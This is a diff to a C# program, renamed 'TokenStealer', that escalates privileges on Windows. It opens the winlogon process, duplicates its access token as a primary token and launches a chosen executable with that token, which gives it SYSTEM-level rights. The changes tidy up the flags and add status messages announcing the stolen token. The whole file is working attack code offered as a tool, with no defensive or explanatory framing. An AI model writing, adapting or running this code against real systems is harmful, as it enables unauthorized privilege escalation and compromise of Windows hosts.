@@ -1,11 +1,8 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using System.Security.Permissions;
-using System.Text;
-using System.Threading.Tasks;
 
-namespace LeakMyToken
+namespace TokenStealer
 {
     internal class Program
     {
@@ -21,7 +18,7 @@ namespace LeakMyToken
             SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);
 
         [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
         static readonly uint PROCESS_ACCESS_FLAG = 0x001F0FFF;
 
@@ -31,17 +28,7 @@ namespace LeakMyToken
             NetCredentialsOnly
         }
 
-        public enum CreationFlags
-
-        {
-            DefaultErrorMode = 0x04000000,
-            NewConsole = 0x00000010,
-            NewProcessGroup = 0x00000200,
-            SeparateWOWVDM = 0x00000800,
-            Suspended = 0x00000004,
-            UnicodeEnvironment = 0x00000400,
-            ExtendedStartupInfoPresent = 0x00080000
-        }
+        static readonly uint CreateWithConsole = 0x00000010;
 
         [Flags()]
         enum  TAF : int
@@ -62,8 +49,7 @@ namespace LeakMyToken
                 TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                 TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                 TOKEN_ADJUST_SESSIONID),
-            TOKEN_QALL = TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
-            TOKALO = TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY
+            TOKEN_NEEDED = TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -88,16 +74,14 @@ namespace LeakMyToken
             TokenImpersonation
         }
 
-        // This also works with CharSet.Ansi as long as the calling function uses the same character set.
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        [StructLayout(LayoutKind.Sequential)]
         public struct STARTUPINFOEX
         {
             public STARTUPINFO StartupInfo;
             public IntPtr lpAttributeList;
         }
 
-        // This also works with CharSet.Ansi as long as the calling function uses the same character set.
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        [StructLayout(LayoutKind.Sequential)]
         public struct STARTUPINFO
         {
             public Int32 cb;
@@ -137,31 +121,32 @@ namespace LeakMyToken
             // open process 
             int pid = Process.GetProcessesByName("winlogon")[0].Id;
             IntPtr hProc = OpenProcess(PROCESS_ACCESS_FLAG, false, pid);
+            Console.WriteLine("[+] Accessing winlogon...");
 
             // open process token
             IntPtr hToken = IntPtr.Zero;
             bool opToken = OpenProcessToken(hProc, (int)TAF.TOKEN_DUPLICATE, out hToken);
-
+            
             // duplicate token ex
             IntPtr newToken;
-            bool dupToken = DuplicateTokenEx(hToken, (uint)TAF.TOKALO, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+            bool dupToken = DuplicateTokenEx(hToken, (uint)TAF.TOKEN_NEEDED, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                 TOKEN_TYPE.TokenPrimary, out newToken);
+        
+            Console.WriteLine("[+] Create process with winlogon\'s token...");
 
             // create process with token
             STARTUPINFO si = new STARTUPINFO();
             si.cb = Marshal.SizeOf(si);
             PROCESS_INFORMATION procinfo = new PROCESS_INFORMATION();
 
-            bool created = CreateProcessWithTokenW(newToken, LogonFlags.WithProfile, execute, null, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out procinfo);
+            bool created = CreateProcessWithTokenW(newToken, LogonFlags.WithProfile, execute, null, CreateWithConsole, IntPtr.Zero, null, ref si, out procinfo);
             if (!created)
             {
-                Console.WriteLine("not spawned");
+                Console.WriteLine("[-] Process not spawned. Something went wrong.");
             }
             else {
-                Console.WriteLine("[+] spawned");
+                Console.WriteLine("[+] Process spawned with token that was stolen.");
             }
-
-            // execute it
 
         }
     }
